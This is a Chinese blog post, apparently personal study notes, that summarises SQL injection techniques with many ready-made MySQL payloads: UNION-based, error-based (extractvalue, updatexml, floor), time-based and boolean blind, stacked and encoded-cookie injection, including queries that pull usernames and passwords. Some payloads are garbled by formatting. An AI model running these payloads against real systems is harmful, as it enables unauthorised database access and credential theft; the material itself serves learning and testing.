

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E6%A5%BD.png">
  <link rel="icon" href="/img/%E6%A5%BD.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="神楽">
  <meta name="keywords" content="">
  
    <meta name="description" content="一、sql注入概述SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。 二、寻找sql注入测试注入">
<meta property="og:type" content="article">
<meta property="og:title" content="浅谈Sql注入总结笔记整理">
<meta property="og:url" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/index.html">
<meta property="og:site_name" content="神楽的博客">
<meta property="og:description" content="一、sql注入概述SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。 二、寻找sql注入测试注入">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765090_62cf7ce22bc5cb101dc1b.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765211_62cf7d5ba9f990b10b6f3.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765459_62cf7e536914d9a20eebd.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765520_62cf7e901e5532a44c092.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765539_62cf7ea3330691d8a8415.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765568_62cf7ec07edc75bbb2cd0.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765587_62cf7ed363bca35f96495.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765602_62cf7ee2335a18b91bc38.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765618_62cf7ef2f3244c1249103.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765644_62cf7f0c4a9bf9f4e426d.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765719_62cf7f578b907ecc13fdc.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765734_62cf7f6657d4c137788e0.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765752_62cf7f787d9033b77f774.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765776_62cf7f9087fb6626ca007.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765789_62cf7f9d50b3e1805fb70.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657766248_62cf8168dbaad26776ceb.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765814_62cf7fb6ed96ca3d6341d.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765836_62cf7fcc12b6e7da878c0.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765847_62cf7fd738ed7ab7c3339.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765866_62cf7fea9f4e6948d11dd.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765888_62cf80001865e22a5f8e0.png">
<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765907_62cf8013ada166b4cf32d.png">
<meta property="article:published_time" content="2024-06-26T17:12:31.000Z">
<meta property="article:modified_time" content="2025-01-21T10:51:48.901Z">
<meta property="article:author" content="神楽">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765090_62cf7ce22bc5cb101dc1b.png">
  
  
  
  <title>浅谈Sql注入总结笔记整理 - 神楽的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>神楽的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="浅谈Sql注入总结笔记整理"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-27 01:12" pubdate>
          2024年6月27日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          75 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">浅谈Sql注入总结笔记整理</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年1月21日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h2 id="一、sql注入概述"><a href="#一、sql注入概述" class="headerlink" title="一、sql注入概述"></a><strong>一、sql注入概述</strong></h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。</p>
<h2 id="二、寻找sql注入"><a href="#二、寻找sql注入" class="headerlink" title="二、寻找sql注入"></a><strong>二、寻找sql注入</strong></h2><p>测试注入点：</p>
<p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p>
<p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p>
<p>2.通过构造get、post、cookie请求再相应的http头信息等查找敏感喜喜</p>
<p>3.通过构造一些语句，检测服务器中响应的异常</p>
<h2 id="三、sql注入的类型"><a href="#三、sql注入的类型" class="headerlink" title="三、sql注入的类型"></a><strong>三、sql注入的类型</strong></h2><p>附上自己整理的思维导图学习</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765090_62cf7ce22bc5cb101dc1b.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>常见的数据库类型，分为关系型数据库和非关系型数据库</p>
<p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p>
<p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p>
<h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a><strong>Mysql注入</strong></h2><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765211_62cf7d5ba9f990b10b6f3.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>数字型：</p>
<p>测试步骤：</p>
<p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p>
<p>对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
<p>（2） 加and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p>
<p>对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p>
<p>（3） 加and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p>
<p>对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p>
<p>字符型</p>
<p>测试步骤：</p>
<p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p>
<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
<p>（2） 加 ‘ and 1&#x3D;1 此时sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p>
<p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p>
<p>（3） 加and 1&#x3D;2— 此时sql语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p>
<p>如果满足以上三点，可以判断该url为字符型注入。</p>
<p>判断列数：</p>
<p>?id&#x3D;1’ order by 4# 报错</p>
<p>?id&#x3D;1’ order by 3# 没有报错，说明存在3列</p>
<p>爆出数据库：</p>
<p>?id&#x3D;-1’ union select 1,database(),3–+</p>
<p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p>
<p>爆出数据表：</p>
<p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p>
<p>爆出字段：</p>
<p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p>
<p>爆出数据值：</p>
<p>?id&#x3D;-1’ union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名–+</p>
<p>拓展一些其他函数：</p>
<p>system_user() 系统用户名</p>
<p>user() 用户名</p>
<p>current_user 当前用户名</p>
<p>session_user()连接数据库的用户名</p>
<p>database() 数据库名</p>
<p>version() MYSQL数据库版本</p>
<p>load_file() MYSQL读取本地文件的函数</p>
<p>@@datadir 读取数据库路径</p>
<p>@@basedir MYSQL 安装路径</p>
<p>@@version_compile_os 操作系统</p>
<p>多条数据显示函数：</p>
<p>concat()、group_concat()、concat_ws()</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>extractvalue函数：</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p>
<p>updatexml函数：</p>
<p>细节问题： extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上<code>1</code>，如：（1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<code>**1**</code>)–+ （爆数据库）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p>
<p>exp函数溢出错误：</p>
<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
<p>floor函数：</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变limit得到其他)</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出users表）</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出password字段）</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a><strong>延时注入</strong></h3><p>判断注入点：</p>
<p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F;正常休眠</p>
<p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F;无休眠</p>
<p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F;无休眠</p>
<p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F;无休眠</p>
<p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p>
<p>爆出数据库：</p>
<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p>
<p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一</p>
<p>substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p>
<p>爆出数据表：</p>
<p>?id&#x3D;1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p>
<p>解释：security的第一张表的第一个字符ascii为101，为字符e</p>
<p>limit 0,1),N,1还是改变N的的得出第二个字符</p>
<p>再判断字符（ascii判断）</p>
<p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p>
<p>（left语句判断）</p>
<p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p>
<p>?id&#x3D;1’ and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p>
<p>Substring函数判断</p>
<p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p>
<p>附上一篇文档（盲注脚本）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41598660/article/details/105162513">https://blog.csdn.net/weixin_41598660/article/details/105162513</a></p>
<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h3><p>Left判断</p>
<p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+</p>
<p>?id&#x3D;1’ and left(database(),2) &gt; ‘sa’ –+</p>
<p>Like语句判断</p>
<p>?id&#x3D;1’ and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like ‘e%’–+</p>
<p>Ascii语句判断</p>
<p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h3><p>?id&#x3D;1’ order by 3%23</p>
<p>?id&#x3D;1’;show tables%23</p>
<p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p>
<p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#<br> <br><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765459_62cf7e536914d9a20eebd.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><strong>二次注入</strong></h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。  
 </p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765520_62cf7e901e5532a44c092.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>博客链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p>
<h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a><strong>加密解密注入</strong></h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p>
<p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p>
<p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入</p>
